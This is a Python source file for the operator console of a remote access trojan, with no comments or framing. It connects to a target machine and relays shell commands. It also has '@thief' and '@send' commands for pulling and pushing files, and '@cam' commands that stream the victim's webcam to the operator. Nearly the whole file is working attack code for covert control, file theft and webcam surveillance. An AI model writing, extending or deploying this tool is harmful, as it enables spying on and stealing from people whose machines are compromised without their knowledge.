import socket                   # Import socket module
import sys
import threading as the
import struct
import pickle
import cv2
import colorama
import os

Target_Ip = sys.argv[1] 
Network = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
Network.connect((Target_Ip,8485))
connection = Network.makefile('wb')



Current_dir = "root"

def Cam_Recv():
   Con = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   Con.connect((Target_Ip,8485))
   data = b""
   payload_size = struct.calcsize(">L")
   while True:
      while len(data) < payload_size:
         data += Con.recv(4096)
      packed_msg_size = data[:payload_size]
      data = data[payload_size:]
      msg_size = struct.unpack(">L", packed_msg_size)[0]
      while len(data) < msg_size:
         data += Con.recv(4096)
      frame_data = data[:msg_size]
      data = data[msg_size:]
      frame=pickle.loads(frame_data, fix_imports=True, encoding="bytes")
      frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
      cv2.imshow('Target',frame)
      cv2.waitKey(1)
         
def Cam_Send():
   Cons = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   Cons.connect((Target_Ip,8485))
   Cam = cv2.VideoCapture(0)
   Cam.set(3, 1920)
   Cam.set(4, 1080)
   encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 90]
   while True:
      ret, frame = Cam.read()
      result, frame = cv2.imencode('.jpeg', frame, encode_param)
      data = pickle.dumps(frame, 0)
      size = len(data)
      Cons.sendall(struct.pack(">L", size) + data)
   Cam.release()

def Get_FIle(Command):
   Condd = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   Condd.connect((Target_Ip,8485))

   buffer_size=Condd.recv(2048).decode()
   if buffer_size == "Error while on file":
      print("Something Error")
   else:
      with open("Thief "+Command.split(" ")[1], 'wb') as file:
         data = Condd.recv(int(buffer_size))
         if not data:
            print("break")
         file.write(data)
         file.close()
      print("[0_0] FIle is Succfully thief")

def Send_FIle(FIle_path):
   Condd = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   Condd.connect((Target_Ip,8485))
   try:
      f = open(FIle_path,'rb')
      buffer_size = os.path.getsize(FIle_path)
      Condd.send(str(buffer_size).encode())
      data = f.read()
      while (data):
         Condd.send(data)
         data = False
         f.close()
      print("[0_0] FIle is Succfully Sended")
   except:
      Condd.send("Error while on file".encode())

while True:
   print()
   Command = input(colorama.Fore.GREEN + f"[$] "+"{ " + Current_dir + " }"+"  --> : ")
   print(colorama.Fore.YELLOW)
   Network.send(Command.encode())

   if Command.split(" ")[0] == "cd":
      Current_dir = Network.recv(2048).decode()
      print(f"CURRENT_PATH : {Current_dir}")
   elif Command.split(" ")[0] == "@thief":
      Get_FIle(Command)
   elif Command.split(" ")[0] == "@send":
      path = input("Enter Path FIle : ")
      Send_FIle(path)
   elif Command.split(" ")[0] == "@cam":
      if Command.split(" ")[1] == "cast":
         Cam_sen = the.Thread(target= Cam_Send).start()
         datas  = Network.recv(2048).decode()
         print(datas)
      elif Command.split(" ")[1] == "show":
         Cam_Rec = the.Thread(target=Cam_Recv).start()
         datas  = Network.recv(2048).decode()
         print(datas)

   elif Command.split(" ")[0] == "dir":
      datas = Network.recv(2048).decode().split("    ")
      print(*datas,sep="\n") 
   else:
      Package = Network.recv(2048).decode()
      Error = Network.recv(2048).decode()
      Current_dir = Network.recv(2048).decode()
      print("Output ::")
      print("    "+Package)
      print("")
      print(colorama.Fore.RED+"Error ::")
      print("")
      print(colorama.Fore.LIGHTRED_EX  +"    "+Error)
